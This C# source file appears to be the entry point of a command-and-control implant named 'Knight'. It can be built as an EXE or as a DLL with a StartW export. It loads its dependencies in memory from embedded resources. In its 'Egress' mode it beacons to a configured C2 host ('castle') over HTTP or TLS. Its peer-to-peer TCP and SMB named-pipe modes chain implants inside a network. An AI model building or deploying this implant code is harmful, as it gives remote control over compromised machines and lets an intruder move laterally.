//-------------------- Test
//#define EXE
//#define DLL
//#define Egress
//#define P2P_TCP_SERVER
//#define P2P_TCP_CLIENT
//#define P2P_SMB_SERVER
//#define P2P_SMB_CLIENT
//--------------------

#if Egress
using Knight.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Security.Principal;
using System.Threading;
using System.Diagnostics.Eventing.Reader;
using System.Diagnostics.Tracing;
using Knight.Models.Knight;
using Knight.Models.Comm;
using Knight.Models.Raven;
using System.Threading.Tasks;
using Knight;
using System.Reflection;

namespace KnightDriver
{
    public static class Program
    {
#if EXE
        public static async Task Main(string[] args)
#elif DLL
        public static async Task StartW()
#endif
        {
            // Load Dependencies from embedded resources
            AppDomain.CurrentDomain.AssemblyResolve += (sender, arr) => {
                
                string resourceName = Settings.SharedArsenal;
                using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
                {                    
                    Console.WriteLine($"[*] Loading Resource: {resourceName}");
                    Byte[] assemblyData = new Byte[stream.Length];
                    stream.Read(assemblyData, 0, assemblyData.Length);
                    return Assembly.Load(assemblyData);
                }
            };

            string castle = Settings.castle;
            bool tls = Settings.tls;
            int port = Settings.port;
            #region ARGS
            //if (args.Length == 0)
            //{
            //    Usage();
            //    System.Environment.Exit(0);
            //}

            //string castle = string.Empty;
            //int port = 0;
            //bool tls = false;

            //for (int i = 0; i < args.Length; i++)
            //{
            //    if (args[i] == "-h" && args.Length > i + 1)
            //    {
            //        castle = args[i + 1];
            //        i++;
            //    }
            //    else if (args[i] == "-p" && args.Length > i + 1)
            //    {
            //        port = Int32.Parse(args[i + 1]);
            //        i++;
            //    }
            //    else if (args[i] == "-s")
            //    {
            //        tls = true;
            //    }
            //}

            //if (castle == string.Empty || port == 0)
            //{
            //    Usage();
            //    System.Environment.Exit(1);
            //}
            #endregion

            var knight = new Knight.Knight();
            await knight.Start(tls, castle, port);
        }

        //private static void Usage()
        //{
        //    Console.WriteLine("Usage: ");
        //    Console.WriteLine("Http:       -h <ip/hostname> -p <port>");
        //    Console.WriteLine("Https:   -s -h <ip/hostname> -p <port>");
        //}
    }
    //internal static class Program
    //{
    //    private static async Task Main(string[] args)
    //    {
    //        Console.WriteLine("Usage: ./program.exe <tls (optional)> <ip/hostname> <port>");

    //        //string castle = "localhost";
    //        bool tls = false;
    //        string castle = "127.0.0.1";
    //        int port = 8080;

    //        if (args.Length == 2)
    //        {
    //            castle = args[0];
    //            port = int.Parse(args[1]);
    //        }
    //        else if (args.Length == 3)
    //        {
    //            tls = true;
    //            castle = args[1];
    //            port = int.Parse(args[2]);
    //        }

    //        var knight = new Knight.Knight();
    //        await knight.Start(tls, castle, port);
    //    }
    //}
}
#endif


#if !Egress
using System;
using System.Reflection;
using System.Threading.Tasks;

namespace Knight
{
    internal static class Program
    {
        public static async Task Main(string[] args)
        {
            //if (args.Length == 0)
            //{
            //    Usage();
            //    System.Environment.Exit(0);
            //}

            // public async Task StartTcp(bool isServer, bool loopback, string remoteAddress, int port)            
            //bool loopback = false;
            //string remoteAddress = string.Empty;
            //int? port = null;
            // public async Task StartSmb(bool isServer, string pipename, string hostname)
            //string pipename = string.Empty;
            //string hostname = string.Empty;

            // Load Dependencies from embedded resources
            AppDomain.CurrentDomain.AssemblyResolve += (sender, arr) => {

                string resourceName = Settings.SharedArsenal;
                using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
                {
                    Console.WriteLine($"[*] Loading Resource: {resourceName}");
                    Byte[] assemblyData = new Byte[stream.Length];
                    stream.Read(assemblyData, 0, assemblyData.Length);
                    return Assembly.Load(assemblyData);
                }
            };

            Knight knightP2P = null;

            #region ARGS_P2P
            //if (args[0] == "tcp_server")
            //{
            //    for (int i = 1; i < args.Length; i++)
            //    {
            //        Console.WriteLine(i + " : " + args[i]);

            //        if (args[i] == "-l")
            //        {
            //            loopback = true;
            //        }
            //        else if (args[i] == "-p" && args.Length >= i + 1)
            //        {
            //            port = Int32.Parse(args[i + 1]);
            //        }
            //    }

            //    if (port != null)
            //    {
            //        knightP2P = new Knight();
            //        await knightP2P.StartAsTcpServer(loopback, (int)port);
            //    }
            //}
            //if (args[0] == "tcp_client")
            //{
            //    for (int i = 1; i < args.Length; i++)
            //    {
            //        Console.WriteLine(i + " : " + args[i]);

            //        if (args[i] == "-r" && args.Length >= i + 1)
            //        {
            //            remoteAddress = args[i + 1];
            //        }
            //        else if (args[i] == "-p" && args.Length >= i + 1)
            //        {
            //            port = Int32.Parse(args[i + 1]);
            //        }
            //    }

            //    if (remoteAddress != string.Empty && port != null)
            //    {
            //        knightP2P = new Knight();
            //        await knightP2P.StartAsTcpClient(remoteAddress, (int)port);
            //    }
            //}
            //else if (args[0] == "smb_server")
            //{
            //    for (int i = 1; i < args.Length; i++)
            //    {

            //        if (args[i] == "-p" && args.Length >= i + 1)
            //        {
            //            pipename = args[i + 1];
            //        }
            //    }

            //    if (pipename != string.Empty)
            //    {
            //        knightP2P = new Knight();
            //        await knightP2P.StartAsSmbServer(pipename);
            //    }
            //}
            //else if (args[0] == "smb_client")
            //{
            //    for (int i = 1; i < args.Length; i++)
            //    {

            //        if (args[i] == "-p" && args.Length >= i + 1)
            //        {
            //            pipename = args[i + 1];
            //        }
            //        else if (args[i] == "-h" && args.Length >= i + 1)
            //        {
            //            hostname = args[i + 1];
            //        }
            //    }

            //    if (hostname != string.Empty && pipename != string.Empty)
            //    {
            //        knightP2P = new Knight();
            //        await knightP2P.StartAsSmbClient(hostname, pipename);
            //    }
            //}

            //Usage();
            //System.Environment.Exit(0);
            #endregion

            //-------------------- P2P TCP SERVER
#if P2P_TCP_SERVER
            bool loopback = Settings.loopback;
            int? port = Settings.port;

            knightP2P = new Knight();
            await knightP2P.StartAsTcpServer(loopback, (int)port);

            //-------------------- P2P TCP CLIENT
#elif P2P_TCP_CLIENT
            string remoteAddress = Settings.remoteAddress;
            int? port = Settings.port;

            knightP2P = new Knight();
            await knightP2P.StartAsTcpClient(remoteAddress, (int)port);
            //-------------------- P2P  SMB SERVER
#elif P2P_SMB_SERVER
            string pipename = Settings.pipename;
            
            knightP2P = new Knight();
            await knightP2P.StartAsSmbServer(pipename);
        //-------------------- P2P  SMB CLIENT
#elif P2P_SMB_CLIENT
            string pipename = Settings.pipename;
            string hostname = Settings.hostname;

            knightP2P = new Knight();
            await knightP2P.StartAsSmbClient(hostname, pipename);
#endif

        }

        //private static void Usage()
        //{
        //    Console.WriteLine("Usage: ");
        //    Console.WriteLine("Tcp Server (loopback): tcp_server -l -p <#>");
        //    Console.WriteLine("Tcp Server (any):      tcp_server -p <#>");
        //    Console.WriteLine("Tcp Client:            tcp_client -r <x.x.x.x> -p <#>");
        //    Console.WriteLine("Smb Server:            smb_server -p <pipename>");
        //    Console.WriteLine("Smb Client:            smb_client -h <hostname> -p <pipename>");
        //}
    }
}
#endif